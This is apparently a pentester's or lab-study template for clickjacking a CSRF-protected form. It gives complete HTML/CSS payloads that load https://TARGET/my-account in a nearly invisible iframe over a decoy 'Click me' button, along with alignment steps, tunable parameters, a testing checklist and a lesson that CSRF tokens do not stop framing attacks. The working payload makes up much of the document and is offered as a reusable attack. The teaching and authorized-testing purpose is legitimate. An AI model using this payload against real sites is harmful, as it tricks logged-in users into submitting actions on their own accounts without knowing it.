# CSRF-Protected Clickjacking Payload

## Purpose

Payload template for testing clickjacking against a target page containing a CSRF-protected form.

The technique relies on the victim's authenticated session and the legitimate target page being loaded inside the iframe.

---

## Basic Payload

```html
<style>
    iframe {
        position: relative;
        width: 700px;
        height: 500px;
        opacity: 0.1;
        z-index: 2;
    }

    div {
        position: absolute;
        top: 400px;
        left: 80px;
        z-index: 1;
    }
</style>

<div>Click me</div>

<iframe src="https://TARGET/my-account"></iframe>
```

---

## Final Payload

After the target control has been correctly aligned:

```html
<style>
    iframe {
        position: relative;
        width: 700px;
        height: 500px;
        opacity: 0.0001;
        z-index: 2;
    }

    div {
        position: absolute;
        top: 400px;
        left: 80px;
        z-index: 1;
    }
</style>

<div>Click me</div>

<iframe src="https://TARGET/my-account"></iframe>
```

---

## Concept

```text
Victim Authenticated
        ↓
Legitimate Target Page
        ↓
Valid CSRF Token
        ↓
Target Page Loaded in iframe
        ↓
Visible Decoy
        ↓
Victim Click
        ↓
CSRF-Protected Form Submitted
```

---

## Important Point

The attacker does not necessarily need to know the CSRF token.

The target page is loaded from the legitimate application in the victim's authenticated browser session.

Therefore:

```text
CSRF Token
      ≠
Clickjacking Protection
```

---

## Alignment

During testing:

```css
opacity: 0.1;
```

Use the visible iframe to locate the target form control.

Adjust:

```css
top: 400px;
left: 80px;
```

until:

```text
Visible Decoy
      ↓
Target Form Button
```

are correctly aligned.

---

## Final Visibility

After alignment:

```css
opacity: 0.0001;
```

can be used to make the target interface effectively invisible.

---

## Adjustable Parameters

```text
TARGET
/my-account
width
height
top
left
opacity
z-index
```

---

## Testing Checklist

```text
☐ Target is authorized
☐ Victim authentication confirmed
☐ CSRF-protected action identified
☐ Target page is frameable
☐ X-Frame-Options checked
☐ CSP frame-ancestors checked
☐ iframe loads correctly
☐ Target control identified
☐ Decoy aligned
☐ Interaction verified
☐ Final PoC tested
```

---

## Key Learning

The payload demonstrates that a valid CSRF token does not by itself prevent a clickjacking attack.

The important security boundary being tested is:

```text
Can the sensitive page be embedded?
```

rather than:

```text
Does the form contain a CSRF token?
```